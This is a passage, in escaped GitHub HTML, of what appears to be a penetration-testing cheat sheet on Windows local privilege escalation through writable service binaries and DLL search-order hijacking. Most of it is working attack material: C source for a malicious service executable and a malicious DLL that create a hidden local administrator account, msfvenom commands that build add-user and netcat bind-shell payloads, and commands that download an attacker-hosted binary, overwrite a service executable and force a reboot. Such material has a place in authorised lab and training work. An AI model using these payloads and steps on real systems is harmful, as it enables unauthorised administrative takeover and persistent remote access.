class=\"pl-c1\"\u003eenv:\u003c/span\u003eUserName\u003c/span\u003e \u003cspan class=\"pl-k\"\u003e-and\u003c/span\u003e \u003cspan class=\"pl-c1\"\u003e$_\u003cspan class=\"pl-smi\"\u003e.TaskToRun\u003c/span\u003e\u003c/span\u003e \u003cspan class=\"pl-k\"\u003e-notlike\u003c/span\u003e \u003cspan class=\"pl-s\"\u003e\u003cspan class=\"pl-pds\"\u003e\"\u003c/span\u003e%windir%*\u003cspan class=\"pl-pds\"\u003e\"\u003c/span\u003e\u003c/span\u003e \u003cspan class=\"pl-k\"\u003e-and\u003c/span\u003e \u003cspan class=\"pl-c1\"\u003e$_\u003cspan class=\"pl-smi\"\u003e.TaskToRun\u003c/span\u003e\u003c/span\u003e \u003cspan class=\"pl-k\"\u003e-ne\u003c/span\u003e \u003cspan class=\"pl-s\"\u003e\u003cspan class=\"pl-pds\"\u003e\"\u003c/span\u003eCOM handler\u003cspan class=\"pl-pds\"\u003e\"\u003c/span\u003e\u003c/span\u003e \u003cspan class=\"pl-k\"\u003e-and\u003c/span\u003e \u003cspan class=\"pl-c1\"\u003e$_\u003cspan class=\"pl-smi\"\u003e.TaskToRun\u003c/span\u003e\u003c/span\u003e \u003cspan class=\"pl-k\"\u003e-notlike\u003c/span\u003e \u003cspan class=\"pl-s\"\u003e\u003cspan class=\"pl-pds\"\u003e\"\u003c/span\u003e%systemroot%*\u003cspan class=\"pl-pds\"\u003e\"\u003c/span\u003e\u003c/span\u003e \u003cspan class=\"pl-k\"\u003e-and\u003c/span\u003e \u003cspan class=\"pl-c1\"\u003e$_\u003cspan class=\"pl-smi\"\u003e.TaskToRun\u003c/span\u003e\u003c/span\u003e \u003cspan class=\"pl-k\"\u003e-notlike\u003c/span\u003e \u003cspan class=\"pl-s\"\u003e\u003cspan class=\"pl-pds\"\u003e\"\u003c/span\u003eC:\\Windows\\*\u003cspan class=\"pl-pds\"\u003e\"\u003c/span\u003e\u003c/span\u003e \u003cspan class=\"pl-k\"\u003e-and\u003c/span\u003e \u003cspan class=\"pl-c1\"\u003e$_\u003cspan class=\"pl-smi\"\u003e.TaskName\u003c/span\u003e\u003c/span\u003e \u003cspan class=\"pl-k\"\u003e-notlike\u003c/span\u003e \u003cspan class=\"pl-s\"\u003e\u003cspan class=\"pl-pds\"\u003e\"\u003c/span\u003e\\Microsoft\\Windows\\*\u003cspan class=\"pl-pds\"\u003e\"\u003c/span\u003e\u003c/span\u003e}\u003c/pre\u003e\u003c/div\u003e\n\u003cp dir=\"auto\"\u003eNext, check permissions of binary files:\u003c/p\u003e\n\u003cdiv class=\"highlight highlight-source-powershell notranslate position-relative overflow-auto\" dir=\"auto\" data-snippet-clipboard-copy-content=\"icacls \u0026quot;C:\\path\\to\\binary.exe\u0026quot;\"\u003e\u003cpre\u003eicacls \u003cspan class=\"pl-s\"\u003e\u003cspan class=\"pl-pds\"\u003e\"\u003c/span\u003eC:\\path\\to\\binary.exe\u003cspan class=\"pl-pds\"\u003e\"\u003c/span\u003e\u003c/span\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp dir=\"auto\"\u003eCommon \u003ccode\u003eicacls\u003c/code\u003e permissions masks:\u003c/p\u003e\n\u003cmarkdown-accessiblity-table\u003e\u003ctable\u003e\n\u003cthead\u003e\n\u003ctr\u003e\n\u003cth\u003eMask\u003c/th\u003e\n\u003cth\u003ePermissions\u003c/th\u003e\n\u003c/tr\u003e\n\u003c/thead\u003e\n\u003ctbody\u003e\n\u003ctr\u003e\n\u003ctd\u003eF\u003c/td\u003e\n\u003ctd\u003eFull access\u003c/td\u003e\n\u003c/tr\u003e\n\u003ctr\u003e\n\u003ctd\u003eM\u003c/td\u003e\n\u003ctd\u003eModify access\u003c/td\u003e\n\u003c/tr\u003e\n\u003ctr\u003e\n\u003ctd\u003eRX\u003c/td\u003e\n\u003ctd\u003eRead and execute access\u003c/td\u003e\n\u003c/tr\u003e\n\u003ctr\u003e\n\u003ctd\u003eR\u003c/td\u003e\n\u003ctd\u003eRead-only access\u003c/td\u003e\n\u003c/tr\u003e\n\u003ctr\u003e\n\u003ctd\u003eW\u003c/td\u003e\n\u003ctd\u003eWrite-only access\u003c/td\u003e\n\u003c/tr\u003e\n\u003c/tbody\u003e\n\u003c/table\u003e\u003c/markdown-accessiblity-table\u003e\n\u003cp dir=\"auto\"\u003eLook for ones that allow writing (F, M, W), especially under \u003ccode\u003eAuthenticated Users\u003c/code\u003e.\u003c/p\u003e\n\u003cp dir=\"auto\"\u003e\u003cstrong\u003eExploiting the vulnerability\u003c/strong\u003e:\u003c/p\u003e\n\u003cp dir=\"auto\"\u003eIf the service binary is invoked without arguments, you can easily use \u003ccode\u003ePowerUp.ps1\u003c/code\u003e to exploit it:\u003c/p\u003e\n\u003cdiv class=\"highlight highlight-source-powershell notranslate position-relative overflow-auto\" dir=\"auto\" data-snippet-clipboard-copy-content=\"# create new local admin user derp:herpderp\npowershell -ep bypass\n. .\\PowerUp.ps1\nInstall-ServiceBinary -User 'derp' -Password 'herpderp' -ServiceName 'SERVICENAME'\n# by default, creates new local user: john with password Password123!\"\u003e\u003cpre\u003e\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e create new local admin user derp:herpderp\u003c/span\u003e\npowershell \u003cspan class=\"pl-k\"\u003e-\u003c/span\u003eep bypass\n\u003cspan class=\"pl-k\"\u003e.\u003c/span\u003e .\\PowerUp.ps1\n\u003cspan class=\"pl-c1\"\u003eInstall-ServiceBinary\u003c/span\u003e \u003cspan class=\"pl-k\"\u003e-\u003c/span\u003eUser \u003cspan class=\"pl-s\"\u003e\u003cspan class=\"pl-pds\"\u003e'\u003c/span\u003ederp\u003cspan class=\"pl-pds\"\u003e'\u003c/span\u003e\u003c/span\u003e \u003cspan class=\"pl-k\"\u003e-\u003c/span\u003ePassword \u003cspan class=\"pl-s\"\u003e\u003cspan class=\"pl-pds\"\u003e'\u003c/span\u003eherpderp\u003cspan class=\"pl-pds\"\u003e'\u003c/span\u003e\u003c/span\u003e \u003cspan class=\"pl-k\"\u003e-\u003c/span\u003eServiceName \u003cspan class=\"pl-s\"\u003e\u003cspan class=\"pl-pds\"\u003e'\u003c/span\u003eSERVICENAME\u003cspan class=\"pl-pds\"\u003e'\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e by default, creates new local user: john with password Password123!\u003c/span\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp dir=\"auto\"\u003eTo exploit manually:\u003c/p\u003e\n\u003cp dir=\"auto\"\u003eCreate a malicious service binary. Here is a simple one that adds a new admin user account:\u003c/p\u003e\n\u003cdiv class=\"highlight highlight-source-c notranslate position-relative overflow-auto\" dir=\"auto\" data-snippet-clipboard-copy-content=\"// compile with:\n// x86_64-w64-mingw32-gcc derp.c -o derp.exe\n\n#include \u0026lt;stdlib.h\u0026gt;\n\nint main ()\n{\n  system (\u0026quot;net user derp herpderp /add\u0026quot;);\n  system (\u0026quot;net localgroup administrators derp /add\u0026quot;);\n  return 0;\n}\"\u003e\u003cpre\u003e\u003cspan class=\"pl-c\"\u003e// compile with:\u003c/span\u003e\n\u003cspan class=\"pl-c\"\u003e// x86_64-w64-mingw32-gcc derp.c -o derp.exe\u003c/span\u003e\n\n\u003cspan class=\"pl-k\"\u003e#include\u003c/span\u003e \u003cspan class=\"pl-s\"\u003e\u0026lt;stdlib.h\u0026gt;\u003c/span\u003e\n\n\u003cspan class=\"pl-smi\"\u003eint\u003c/span\u003e \u003cspan class=\"pl-en\"\u003emain\u003c/span\u003e ()\n{\n  \u003cspan class=\"pl-en\"\u003esystem\u003c/span\u003e (\u003cspan class=\"pl-s\"\u003e\"net user derp herpderp /add\"\u003c/span\u003e);\n  \u003cspan class=\"pl-en\"\u003esystem\u003c/span\u003e (\u003cspan class=\"pl-s\"\u003e\"net localgroup administrators derp /add\"\u003c/span\u003e);\n  \u003cspan class=\"pl-k\"\u003ereturn\u003c/span\u003e \u003cspan class=\"pl-c1\"\u003e0\u003c/span\u003e;\n}\u003c/pre\u003e\u003c/div\u003e\n\u003cp dir=\"auto\"\u003eAlternatively, create the windows service binary with \u003ccode\u003emsfvenom\u003c/code\u003e.\u003c/p\u003e\n\u003cdiv class=\"highlight highlight-source-shell notranslate position-relative overflow-auto\" dir=\"auto\" data-snippet-clipboard-copy-content=\"# add user - msfvenom\nmsfvenom -p windows/adduser -f exe -o derp.exe USER=derp PASS=Herpderp1!\n\n# run arbitrary command - msfvenom\nmsfvenom -p windows/exec -f exe -o derp.exe lport=443 cmd=\u0026quot;C:\\Windows\\Temp\\nc.exe -L -p 6969 -e cmd.exe\u0026quot; lhost=tun0\"\u003e\u003cpre\u003e\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e add user - msfvenom\u003c/span\u003e\nmsfvenom -p windows/adduser -f exe -o derp.exe USER=derp PASS=Herpderp1\u003cspan class=\"pl-k\"\u003e!\u003c/span\u003e\n\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e run arbitrary command - msfvenom\u003c/span\u003e\nmsfvenom -p windows/exec -f exe -o derp.exe lport=443 cmd=\u003cspan class=\"pl-s\"\u003e\u003cspan class=\"pl-pds\"\u003e\"\u003c/span\u003eC:\\Windows\\Temp\\nc.exe -L -p 6969 -e cmd.exe\u003cspan class=\"pl-pds\"\u003e\"\u003c/span\u003e\u003c/span\u003e lhost=tun0\u003c/pre\u003e\u003c/div\u003e\n\u003cp dir=\"auto\"\u003eOnce compiled, transfer over to victim machine and replace the vulnerable service binary with your own.\u003c/p\u003e\n\u003cdiv class=\"highlight highlight-source-powershell notranslate position-relative overflow-auto\" dir=\"auto\" data-snippet-clipboard-copy-content=\"iwr -uri http://192.168.119.3/derp.exe -Outfile derp.exe\nmove C:\\path\\to\\vulnerable\\service.exe service.exe.bak\nmove .\\derp.exe C:\\path\\to\\vulnerable\\service.exe\"\u003e\u003cpre\u003eiwr \u003cspan class=\"pl-k\"\u003e-\u003c/span\u003euri http:\u003cspan class=\"pl-k\"\u003e//\u003c/span\u003e\u003cspan class=\"pl-c1\"\u003e192.168\u003c/span\u003e.\u003cspan class=\"pl-c1\"\u003e119.3\u003c/span\u003e\u003cspan class=\"pl-k\"\u003e/\u003c/span\u003e\u003cspan class=\"pl-c1\"\u003ederp.exe\u003c/span\u003e \u003cspan class=\"pl-k\"\u003e-\u003c/span\u003eOutfile \u003cspan class=\"pl-c1\"\u003ederp.exe\u003c/span\u003e\nmove C:\\path\\to\\vulnerable\\\u003cspan class=\"pl-c1\"\u003eservice.exe\u003c/span\u003e \u003cspan class=\"pl-c1\"\u003eservice.exe\u003c/span\u003e.bak\nmove .\\\u003cspan class=\"pl-c1\"\u003ederp.exe\u003c/span\u003e C:\\path\\to\\vulnerable\\\u003cspan class=\"pl-c1\"\u003eservice.exe\u003c/span\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp dir=\"auto\"\u003eTry to restart the service:\u003c/p\u003e\n\u003cdiv class=\"highlight highlight-source-powershell notranslate position-relative overflow-auto\" dir=\"auto\" data-snippet-clipboard-copy-content=\"net stop SERVICENAME\nnet start SERVICENAME\"\u003e\u003cpre\u003enet stop SERVICENAME\nnet start SERVICENAME\u003c/pre\u003e\u003c/div\u003e\n\u003cp dir=\"auto\"\u003eIf you get \"Access Denied\" error, you may be able to restart service by rebooting machine:\u003c/p\u003e\n\u003cdiv class=\"highlight highlight-source-powershell notranslate position-relative overflow-auto\" dir=\"auto\" data-snippet-clipboard-copy-content=\"# check the StartMode\n# if it's \u0026quot;Auto\u0026quot;, you can restart the service by rebooting\nGet-CimInstance -ClassName win32_service | Select Name, StartMode | Where-Object {$_.Name -like 'SERVICENAME'}\n\n# check that you can reboot\n# look for \u0026quot;SeShutdownPrivilege\u0026quot; being present (doesn't matter if it says \u0026quot;Disabled\u0026quot;)\nwhoami /priv\n\n# restart the machine\nshutdown /r /t 0\"\u003e\u003cpre\u003e\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e check the StartMode\u003c/span\u003e\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e if it's \"Auto\", you can restart the service by rebooting\u003c/span\u003e\n\u003cspan class=\"pl-c1\"\u003eGet-CimInstance\u003c/span\u003e \u003cspan class=\"pl-k\"\u003e-\u003c/span\u003eClassName win32_service \u003cspan class=\"pl-k\"\u003e|\u003c/span\u003e Select Name\u003cspan class=\"pl-k\"\u003e,\u003c/span\u003e StartMode \u003cspan class=\"pl-k\"\u003e|\u003c/span\u003e \u003cspan class=\"pl-c1\"\u003eWhere-Object\u003c/span\u003e {\u003cspan class=\"pl-c1\"\u003e$_\u003cspan class=\"pl-smi\"\u003e.Name\u003c/span\u003e\u003c/span\u003e \u003cspan class=\"pl-k\"\u003e-like\u003c/span\u003e \u003cspan class=\"pl-s\"\u003e\u003cspan class=\"pl-pds\"\u003e'\u003c/span\u003eSERVICENAME\u003cspan class=\"pl-pds\"\u003e'\u003c/span\u003e\u003c/span\u003e}\n\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e check that you can reboot\u003c/span\u003e\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e look for \"SeShutdownPrivilege\" being present (doesn't matter if it says \"Disabled\")\u003c/span\u003e\nwhoami \u003cspan class=\"pl-k\"\u003e/\u003c/span\u003epriv\n\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e restart the machine\u003c/span\u003e\nshutdown \u003cspan class=\"pl-k\"\u003e/\u003c/span\u003er \u003cspan class=\"pl-k\"\u003e/\u003c/span\u003et \u003cspan class=\"pl-c1\"\u003e0\u003c/span\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cdiv class=\"markdown-heading\" dir=\"auto\"\u003e\u003ch3 tabindex=\"-1\" class=\"heading-element\" dir=\"auto\"\u003e4.2.4 Windows DLL Hijacking\u003c/h3\u003e\u003ca id=\"user-content-424-windows-dll-hijacking\" class=\"anchor\" aria-label=\"Permalink: 4.2.4 Windows DLL Hijacking\" href=\"#424-windows-dll-hijacking\"\u003e\u003csvg class=\"octicon octicon-link\" viewBox=\"0 0 16 16\" version=\"1.1\" width=\"16\" height=\"16\" aria-hidden=\"true\"\u003e\u003cpath d=\"m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003e\u003c/div\u003e\n\u003cp dir=\"auto\"\u003eReferences:\u003c/p\u003e\n\u003cul dir=\"auto\"\u003e\n\u003cli\u003e\u003ca href=\"https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation/dll-hijacking\" rel=\"nofollow\"\u003eHackTricks DLL Hijacking\u003c/a\u003e\u003c/li\u003e\n\u003c/ul\u003e\n\u003cp dir=\"auto\"\u003eThere are multiple ways to hijack a DLL. One method is to overwrite an existing DLL that you have write permissions for, but this can often cause the program to crash because it's looking for exports that the malicious DLL doesn't provide.\u003c/p\u003e\n\u003cp dir=\"auto\"\u003eA better way is to abuse the DLL search order (sometimes called \u003cem\u003eSearch Order Hijacking\u003c/em\u003e). Here is the default search order in Windows with \u003cstrong\u003eSafeDllSearchMode\u003c/strong\u003e enabled (when it's disabled, the current working directory jumps up to slot #2):\u003c/p\u003e\n\u003col dir=\"auto\"\u003e\n\u003cli\u003eThe directory from which the application loaded.\u003c/li\u003e\n\u003cli\u003eThe system directory. (\u003ccode\u003eC:\\Windows\\System32\u003c/code\u003e)\u003c/li\u003e\n\u003cli\u003eThe 16-bit system directory. (\u003ccode\u003eC:\\Windows\\System\u003c/code\u003e)\u003c/li\u003e\n\u003cli\u003eThe Windows directory.  (\u003ccode\u003eC:\\Windows\u003c/code\u003e)\u003c/li\u003e\n\u003cli\u003eThe current directory.\u003c/li\u003e\n\u003cli\u003eThe directories that are listed in the PATH environment variable.\u003c/li\u003e\n\u003c/ol\u003e\n\u003cp dir=\"auto\"\u003eNote: if you can edit the SYSTEM PATH variable, you can potentially use that to perform a DLL search order hijack. You can check if you have Write permissions on any directories in the PATH with (WinPEAS does this automatically):\u003c/p\u003e\n\u003cdiv class=\"snippet-clipboard-content notranslate position-relative overflow-auto\" data-snippet-clipboard-copy-content=\"for %%A in (\u0026quot;%path:;=\u0026quot;;\u0026quot;%\u0026quot;) do ( cmd.exe /c icacls \u0026quot;%%~A\u0026quot; 2\u0026gt;nul | findstr /i \u0026quot;(F) (M) (W) :\\\u0026quot; | findstr /i \u0026quot;:\\\\ everyone authenticated users todos %username%\u0026quot; \u0026amp;\u0026amp; echo. )\"\u003e\u003cpre class=\"notranslate\"\u003e\u003ccode\u003efor %%A in (\"%path:;=\";\"%\") do ( cmd.exe /c icacls \"%%~A\" 2\u0026gt;nul | findstr /i \"(F) (M) (W) :\\\" | findstr /i \":\\\\ everyone authenticated users todos %username%\" \u0026amp;\u0026amp; echo. )\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp dir=\"auto\"\u003eYou can check if SafeDLLSearchMode is enabled in the registry:\u003c/p\u003e\n\u003cdiv class=\"highlight highlight-source-powershell notranslate position-relative overflow-auto\" dir=\"auto\" data-snippet-clipboard-copy-content=\"# Enabled = 1, Disabled = 0\nreg query 'HKLM\\System\\CurrentControlSet\\Control\\Session Manager' /v SafeDllSearchMode\n# or\nGet-ItemPropertyValue -Path 'HKLM:\\System\\CurrentControlSet\\Control\\Session Manager' -Name SafeDllSearchMode\"\u003e\u003cpre\u003e\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e Enabled = 1, Disabled = 0\u003c/span\u003e\nreg query \u003cspan class=\"pl-s\"\u003e\u003cspan class=\"pl-pds\"\u003e'\u003c/span\u003eHKLM\\System\\CurrentControlSet\\Control\\Session Manager\u003cspan class=\"pl-pds\"\u003e'\u003c/span\u003e\u003c/span\u003e \u003cspan class=\"pl-k\"\u003e/\u003c/span\u003ev SafeDllSearchMode\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e or\u003c/span\u003e\n\u003cspan class=\"pl-c1\"\u003eGet-ItemPropertyValue\u003c/span\u003e \u003cspan class=\"pl-k\"\u003e-\u003c/span\u003ePath \u003cspan class=\"pl-s\"\u003e\u003cspan class=\"pl-pds\"\u003e'\u003c/span\u003eHKLM:\\System\\CurrentControlSet\\Control\\Session Manager\u003cspan class=\"pl-pds\"\u003e'\u003c/span\u003e\u003c/span\u003e \u003cspan class=\"pl-k\"\u003e-\u003c/span\u003eName SafeDllSearchMode\u003c/pre\u003e\u003c/div\u003e\n\u003cp dir=\"auto\"\u003e\u003cstrong\u003eFinding Missing DLLs\u003c/strong\u003e:\u003c/p\u003e\n\u003cp dir=\"auto\"\u003eAutomated way with PowerUp.ps1:\u003c/p\u003e\n\u003cdiv class=\"highlight highlight-source-powershell notranslate position-relative overflow-auto\" dir=\"auto\" data-snippet-clipboard-copy-content=\"iwr http://LISTEN_IP/PowerUp.ps1 -outfile PowerUp.ps1\npowershell -ep bypass\n. .\\PowerUp.ps1\nFind-ProcessDLLHijack\nFind-PathDLLHijack\"\u003e\u003cpre\u003eiwr http:\u003cspan class=\"pl-k\"\u003e//\u003c/span\u003eLISTEN_IP\u003cspan class=\"pl-k\"\u003e/\u003c/span\u003ePowerUp.ps1 \u003cspan class=\"pl-k\"\u003e-\u003c/span\u003eoutfile PowerUp.ps1\npowershell \u003cspan class=\"pl-k\"\u003e-\u003c/span\u003eep bypass\n\u003cspan class=\"pl-k\"\u003e.\u003c/span\u003e .\\PowerUp.ps1\n\u003cspan class=\"pl-c1\"\u003eFind-ProcessDLLHijack\u003c/span\u003e\n\u003cspan class=\"pl-c1\"\u003eFind-PathDLLHijack\u003c/span\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp dir=\"auto\"\u003eTo manually see if a binary is missing DLLs, you can use Process Monitor (procmon, from \u003ca href=\"https://download.sysinternals.com/files/SysinternalsSuite.zip\" rel=\"nofollow\"\u003eSysinternals\u003c/a\u003e). This requires admin privileges, so you may need to copy over the service binary and DLLs to your own Windows machine to test. It's also possible to perform static binary reverse engineering, but that's a pain.\u003c/p\u003e\n\u003cdiv class=\"highlight highlight-source-shell notranslate position-relative overflow-auto\" dir=\"auto\" data-snippet-clipboard-copy-content=\"wget https://download.sysinternals.com/files/SysinternalsSuite.zip\nunzip -d sysinternals SysinternalsSuite.zip\nimpacket-smbserver -smb2support -user derp -password herpderp share .\n# connect with: net use \\\\ATTACKER_IP herpderp /user:derp\"\u003e\u003cpre\u003ewget https://download.sysinternals.com/files/SysinternalsSuite.zip\nunzip -d sysinternals SysinternalsSuite.zip\nimpacket-smbserver -smb2support -user derp -password herpderp share \u003cspan class=\"pl-c1\"\u003e.\u003c/span\u003e\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e connect with: net use \\\\ATTACKER_IP herpderp /user:derp\u003c/span\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp dir=\"auto\"\u003eAdd Filters to procmon to only see missing DLL events. This happens when \u003ccode\u003eCreateFile()\u003c/code\u003e results in a \u003ccode\u003eNAME NOT FOUND\u003c/code\u003e error while trying to open a DLL.\u003c/p\u003e\n\u003cmarkdown-accessiblity-table\u003e\u003ctable\u003e\n\u003cthead\u003e\n\u003ctr\u003e\n\u003cth\u003eColumn\u003c/th\u003e\n\u003cth\u003eRelation\u003c/th\u003e\n\u003cth\u003eValue\u003c/th\u003e\n\u003cth\u003eAction\u003c/th\u003e\n\u003c/tr\u003e\n\u003c/thead\u003e\n\u003ctbody\u003e\n\u003ctr\u003e\n\u003ctd\u003ePath\u003c/td\u003e\n\u003ctd\u003eends with\u003c/td\u003e\n\u003ctd\u003e.dll\u003c/td\u003e\n\u003ctd\u003eInclude\u003c/td\u003e\n\u003c/tr\u003e\n\u003ctr\u003e\n\u003ctd\u003eResult\u003c/td\u003e\n\u003ctd\u003econtains\u003c/td\u003e\n\u003ctd\u003enot found\u003c/td\u003e\n\u003ctd\u003eInclude\u003c/td\u003e\n\u003c/tr\u003e\n\u003ctr\u003e\n\u003ctd\u003eOperation\u003c/td\u003e\n\u003ctd\u003eis\u003c/td\u003e\n\u003ctd\u003eCreateFile\u003c/td\u003e\n\u003ctd\u003eInclude\u003c/td\u003e\n\u003c/tr\u003e\n\u003ctr\u003e\n\u003ctd\u003eProcess Name\u003c/td\u003e\n\u003ctd\u003eis\u003c/td\u003e\n\u003ctd\u003e\u003ccode\u003eTARGETSVC.exe\u003c/code\u003e\u003c/td\u003e\n\u003ctd\u003eInclude\u003c/td\u003e\n\u003c/tr\u003e\n\u003c/tbody\u003e\n\u003c/table\u003e\u003c/markdown-accessiblity-table\u003e\n\u003cp dir=\"auto\"\u003eRestart the service/process and check procmon to see if it fails to load any DLLs:\u003c/p\u003e\n\u003cdiv class=\"highlight highlight-source-powershell notranslate position-relative overflow-auto\" dir=\"auto\" data-snippet-clipboard-copy-content=\"Restart-Service VICTIMSERVICE\"\u003e\u003cpre\u003e\u003cspan class=\"pl-c1\"\u003eRestart-Service\u003c/span\u003e VICTIMSERVICE\u003c/pre\u003e\u003c/div\u003e\n\u003cp dir=\"auto\"\u003eIf you find DLLs that fail to open, and the search order includes a path that you can write to, you're in luck.\u003c/p\u003e\n\u003cp dir=\"auto\"\u003e\u003cstrong\u003eExploiting:\u003c/strong\u003e\u003c/p\u003e\n\u003cp dir=\"auto\"\u003eCreate a malicious DLL. Here is a simple example that adds a local admin user:\u003c/p\u003e\n\u003cdiv class=\"highlight highlight-source-c notranslate position-relative overflow-auto\" dir=\"auto\" data-snippet-clipboard-copy-content=\"// compile with:\n// x86_64-w64-mingw32-gcc derp.c -shared -o derp.dll\n\n#include \u0026lt;stdlib.h\u0026gt;\n#include \u0026lt;windows.h\u0026gt;\n\nBOOL APIENTRY DllMain(\nHANDLE hModule,// Handle to DLL module\nDWORD ul_reason_for_call,// Reason for calling function\nLPVOID lpReserved ) // Reserved\n{\n  switch ( ul_reason_for_call )\n  {\n    case DLL_PROCESS_ATTACH: // A process is loading the DLL.\n      system (\u0026quot;net user derp herpderp /add\u0026quot;);\n      system (\u0026quot;net localgroup administrators derp /add\u0026quot;);\n      break;\n    case DLL_THREAD_ATTACH: // A process is creating a new thread.\n      break;\n    case DLL_THREAD_DETACH: // A thread exits normally.\n      break;\n    case DLL_PROCESS_DETACH: // A process unloads the DLL.\n      break;\n  }\n  return TRUE;\n}\"\u003e\u003cpre\u003e\u003cspan class=\"pl-c\"\u003e// compile with:\u003c/span\u003e\n\u003cspan class=\"pl-c\"\u003e// x86_64-w64-mingw32-gcc derp.c -shared -o derp.dll\u003c/span\u003e\n\n\u003cspan class=\"pl-k\"\u003e#include\u003c/span\u003e \u003cspan class=\"pl-s\"\u003e\u0026lt;stdlib.h\u0026gt;\u003c/span\u003e\n\u003cspan class=\"pl-k\"\u003e#include\u003c/span\u003e \u003cspan class=\"pl-s\"\u003e\u0026lt;windows.h\u0026gt;\u003c/span\u003e\n\n\u003cspan class=\"pl-smi\"\u003eBOOL\u003c/span\u003e \u003cspan class=\"pl-c1\"\u003eAPIENTRY\u003c/span\u003e \u003cspan class=\"pl-en\"\u003eDllMain\u003c/span\u003e(\n\u003cspan class=\"pl-smi\"\u003eHANDLE\u003c/span\u003e \u003cspan class=\"pl-s1\"\u003ehModule\u003c/span\u003e,\u003cspan class=\"pl-c\"\u003e// Handle to DLL module\u003c/span\u003e\n\u003cspan class=\"pl-smi\"\u003eDWORD\u003c/span\u003e \u003cspan class=\"pl-s1\"\u003eul_reason_for_call\u003c/span\u003e,\u003cspan class=\"pl-c\"\u003e// Reason for calling function\u003c/span\u003e\n\u003cspan class=\"pl-smi\"\u003eLPVOID\u003c/span\u003e \u003cspan class=\"pl-s1\"\u003elpReserved\u003c/span\u003e ) \u003cspan class=\"pl-c\"\u003e// Reserved\u003c/span\u003e\n{\n  \u003cspan class=\"pl-k\"\u003eswitch\u003c/span\u003e ( \u003cspan class=\"pl-s1\"\u003eul_reason_for_call\u003c/span\u003e )\n  {\n    \u003cspan class=\"pl-k\"\u003ecase\u003c/span\u003e \u003cspan class=\"pl-c1\"\u003eDLL_PROCESS_ATTACH\u003c/span\u003e: \u003cspan class=\"pl-c\"\u003e// A process is loading the DLL.\u003c/span\u003e\n      \u003cspan class=\"pl-en\"\u003esystem\u003c/span\u003e (\u003cspan class=\"pl-s\"\u003e\"net user derp herpderp /add\"\u003c/span\u003e);\n      \u003cspan class=\"pl-en\"\u003esystem\u003c/span\u003e (\u003cspan class=\"pl-s\"\u003e\"net localgroup administrators derp /add\"\u003c/span\u003e);\n      \u003cspan class=\"pl-k\"\u003ebreak\u003c/span\u003e;\n    \u003cspan class=\"pl-k\"\u003ecase\u003c/span\u003e \u003cspan class=\"pl-c1\"\u003eDLL_THREAD_ATTACH\u003c/span\u003e: \u003cspan class=\"pl-c\"\u003e// A process is creating a new thread.\u003c/span\u003e\n      \u003cspan class=\"pl-k\"\u003ebreak\u003c/span\u003e;\n    \u003cspan class=\"pl-k\"\u003ecase\u003c/span\u003e \u003cspan class=\"pl-c1\"\u003eDLL_THREAD_DETACH\u003c/span\u003e: \u003cspan class=\"pl-c\"\u003e// A thread exits normally.\u003c/span\u003e\n      \u003cspan class=\"pl-k\"\u003ebreak\u003c/span\u003e;\n    \u003cspan class=\"pl-k\"\u003ecase\u003c/span\u003e \u003cspan class=\"pl-c1\"\u003eDLL_PROCESS_DETACH\u003c/span\u003e: \u003cspan class=\"pl-c\"\u003e// A process unloads the DLL.\u003c/span\u003e\n      \u003cspan class=\"pl-k\"\u003ebreak\u003c/span\u003e;\n  }\n  \u003cspan class=\"pl-k\"\u003ereturn\u003c/span\u003e TRUE;\n}\u003c/pre\u003e\u003c/div\u003e\n\u003cp dir=\"auto\"\u003eAlternatively, you can use \u003ccode\u003emsfvenom\u003c/code\u003e to create a malicious DLL:\u003c/p\u003e\n\u003cdiv class=\"highlight highlight-source-shell notranslate position-relative overflow-auto\" dir=\"auto\" data-snippet-clipboard-copy-content=\"# add user - msfvenom\nmsfvenom -p windows/adduser -f dll -o derp.dll USER=derp PASS=Herpderp1!\"\u003e\u003cpre\u003e\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e add user - msfvenom\u003c/span\u003e\nmsfvenom -p windows/adduser -f dll -o derp.dll USER=derp PASS=Herpderp1\u003cspan 